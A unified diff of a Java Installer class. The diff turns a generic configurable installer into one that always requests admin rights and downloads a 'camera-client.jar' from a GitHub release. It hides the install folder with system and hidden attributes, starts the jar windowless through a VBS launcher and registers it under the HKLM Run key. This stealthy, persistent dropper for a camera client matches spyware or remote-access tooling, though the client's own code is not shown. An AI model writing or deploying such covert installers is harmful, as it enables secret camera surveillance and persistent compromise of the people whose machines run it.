@@ -1,121 +1,110 @@
-import java.io.*;
-import java.net.*;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.FileWriter;
+import java.io.InputStream;
+import java.io.PrintStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
 
 public class Installer {
 
-    // ─── CONFIG ───────────────────────────────────────────────────────────────
-    static final String APP_NAME        = "MyApp";
-    static final String DOWNLOAD_URL    = "https://example.com/myapp.exe"; // <-- change this
-    static final String INSTALL_DIR     = System.getenv("ProgramFiles") + "\\" + APP_NAME;
-    static final String EXE_NAME        = "myapp.exe";
-    static final boolean REQUEST_ADMIN  = false;  // request UAC elevation
-    static final boolean ADD_TO_STARTUP = false;  // register in Windows startup
-    // ──────────────────────────────────────────────────────────────────────────
+    static final String APP_NAME     = "CameraService";
+    static final String DOWNLOAD_URL = "https://github.com/reyHay/reyhancam/releases/latest/download/camera-client.jar";
+    static final String INSTALL_DIR  = "C:\\ProgramData\\CameraService";
+    static final String JAR_NAME     = "camera-client.jar";
+    static final String LAUNCH_SCRIPT= INSTALL_DIR + "\\launch.vbs";
+    static final String LOG_FILE     = "C:\\ProgramData\\installer.log";
 
     public static void main(String[] args) throws Exception {
+        // Log to file (works for both admin and non-admin runs)
+        try {
+            PrintStream log = new PrintStream(new FileOutputStream(LOG_FILE, true));
+            System.setOut(log);
+            System.setErr(log);
+        } catch (Exception ignored) {}
 
-        if (REQUEST_ADMIN && !isAdmin()) {
+        System.out.println("\n--- Installer started ---");
+
+        if (!isAdmin()) {
+            System.out.println("[*] Requesting admin rights...");
             relaunchAsAdmin();
             return;
         }
 
-        System.out.println("[*] Starting installation of " + APP_NAME);
+        System.out.println("[*] Installing " + APP_NAME + "...");
 
-        // 1. Create install directory
+        // 1. Create install directory and hide it
         File installDir = new File(INSTALL_DIR);
-        if (!installDir.exists()) {
-            installDir.mkdirs();
-            System.out.println("[*] Created directory: " + INSTALL_DIR);
+        installDir.mkdirs();
+        new ProcessBuilder("attrib", "+H", "+S", INSTALL_DIR).start().waitFor();
+        System.out.println("[*] Created directory: " + INSTALL_DIR);
+
+        // 2. Download jar only if not already present
+        File jar = new File(INSTALL_DIR + "\\" + JAR_NAME);
+        if (!jar.exists()) {
+            System.out.println("[*] Downloading camera client...");
+            downloadFile(DOWNLOAD_URL, jar);
+            System.out.println("[*] Downloaded.");
+        } else {
+            System.out.println("[*] Jar already exists, skipping download.");
         }
 
-        // 2. Download the application
-        File target = new File(INSTALL_DIR + "\\" + EXE_NAME);
-        System.out.println("[*] Downloading from: " + DOWNLOAD_URL);
-        downloadFile(DOWNLOAD_URL, target);
-        System.out.println("[*] Downloaded to: " + target.getAbsolutePath());
+        // 3. Write VBS launcher (no quotes around jar path needed since no spaces)
+        String vbs = "Set WshShell = CreateObject(\"WScript.Shell\")\r\n"
+                   + "WshShell.Run \"java --enable-native-access=ALL-UNNAMED -jar "
+                   + INSTALL_DIR + "\\" + JAR_NAME
+                   + "\", 0, False\r\n";
+        try (FileWriter fw = new FileWriter(LAUNCH_SCRIPT)) { fw.write(vbs); }
+        System.out.println("[*] Created launcher.");
 
-        // 3. Register in Windows startup (if enabled)
-        if (ADD_TO_STARTUP) {
-            addToStartup(target.getAbsolutePath());
-            System.out.println("[*] Registered in startup.");
-        }
-
-        System.out.println("[+] Installation complete.");
-    }
-
-    // ── Check if running as administrator ────────────────────────────────────
-    static boolean isAdmin() {
-        try {
-            ProcessBuilder pb = new ProcessBuilder("net", "session");
-            pb.redirectErrorStream(true);
-            Process p = pb.start();
-            p.waitFor();
-            return p.exitValue() == 0;
-        } catch (Exception e) {
-            return false;
-        }
-    }
-
-    // ── Relaunch self with UAC elevation via PowerShell ───────────────────────
-    static void relaunchAsAdmin() throws Exception {
-        String jarPath = new File(
-            Installer.class.getProtectionDomain().getCodeSource().getLocation().toURI()
-        ).getAbsolutePath();
-
-        // Uses PowerShell Start-Process with RunAs verb to trigger UAC prompt
-        String[] cmd = {
-            "powershell", "-Command",
-            "Start-Process", "java",
-            "-ArgumentList", "'-jar','" + jarPath + "'",
-            "-Verb", "RunAs"
-        };
-
-        new ProcessBuilder(cmd).start();
-        System.out.println("[*] Requesting admin rights...");
-    }
-
-    // ── Download a file from a URL ────────────────────────────────────────────
-    static void downloadFile(String urlStr, File dest) throws Exception {
-        URL url = new URL(urlStr);
-        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-        conn.setRequestMethod("GET");
-        conn.connect();
-
-        try (InputStream in = conn.getInputStream();
-             FileOutputStream out = new FileOutputStream(dest)) {
-
-            byte[] buf = new byte[8192];
-            int read;
-            long total = 0;
-            long size = conn.getContentLengthLong();
-
-            while ((read = in.read(buf)) != -1) {
-                out.write(buf, 0, read);
-                total += read;
-                if (size > 0) {
-                    int pct = (int) (total * 100 / size);
-                    System.out.print("\r[*] Progress: " + pct + "%");
-                }
-            }
-            System.out.println();
-        }
-    }
-
-    // ── Add app to Windows startup via registry ───────────────────────────────
-    static void addToStartup(String exePath) throws Exception {
-        // Uses reg.exe to write to HKLM run key (requires admin)
-        String[] cmd = {
+        // 4. Register startup
+        String[] reg = {
             "reg", "add",
             "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
             "/v", APP_NAME,
             "/t", "REG_SZ",
-            "/d", exePath,
+            "/d", "wscript.exe \"" + LAUNCH_SCRIPT + "\"",
             "/f"
         };
-        Process p = new ProcessBuilder(cmd).start();
+        Process p = new ProcessBuilder(reg).start();
         p.waitFor();
-        if (p.exitValue() != 0) {
-            System.err.println("[!] Failed to add startup entry. Are you running as admin?");
+        System.out.println(p.exitValue() == 0 ? "[*] Registered in startup." : "[!] Startup registration failed.");
+
+        // 5. Launch now
+        new ProcessBuilder("wscript.exe", LAUNCH_SCRIPT).start();
+        System.out.println("[+] Done. Camera service is running.");
+    }
+
+    static boolean isAdmin() {
+        try {
+            Process p = new ProcessBuilder("net", "session").redirectErrorStream(true).start();
+            p.waitFor();
+            return p.exitValue() == 0;
+        } catch (Exception e) { return false; }
+    }
+
+    static void relaunchAsAdmin() throws Exception {
+        // Get the jar path — works even from ProgramData
+        String jarPath = new File(
+            Installer.class.getProtectionDomain().getCodeSource().getLocation().toURI()
+        ).getAbsolutePath();
+        new ProcessBuilder(
+            "powershell", "-Command",
+            "Start-Process", "java",
+            "-ArgumentList", "'-jar','" + jarPath + "'",
+            "-Verb", "RunAs"
+        ).start();
+    }
+
+    static void downloadFile(String urlStr, File dest) throws Exception {
+        HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
+        conn.setInstanceFollowRedirects(true);
+        conn.setRequestProperty("User-Agent", "Mozilla/5.0");
+        try (InputStream in = conn.getInputStream();
+             FileOutputStream out = new FileOutputStream(dest)) {
+            byte[] buf = new byte[8192];
+            int read;
+            while ((read = in.read(buf)) != -1) out.write(buf, 0, read);
         }
     }
 }
